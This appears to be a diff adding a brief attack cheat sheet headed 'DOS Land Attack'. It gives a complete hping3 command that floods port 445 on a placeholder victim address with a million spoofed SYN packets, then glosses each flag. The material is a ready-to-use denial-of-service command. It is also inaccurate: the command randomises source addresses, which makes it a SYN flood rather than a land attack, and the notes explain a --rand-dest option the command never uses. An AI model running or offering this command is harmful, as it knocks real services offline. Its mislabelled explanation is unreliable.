@@ -1,0 +1,13 @@
+# DOS Land Attack
+hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP
+
+--flood: sent packets as fast as possible. Don't show replies.
+--rand-dest: random destionation address mode. see the man.
+-V <-- Verbose
+-c --count: packet count
+-d --data: data size
+-S --syn: set SYN flag
+-w --win: winsize (default 64)
+-p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
+-s --baseport: base source port (default random)
+
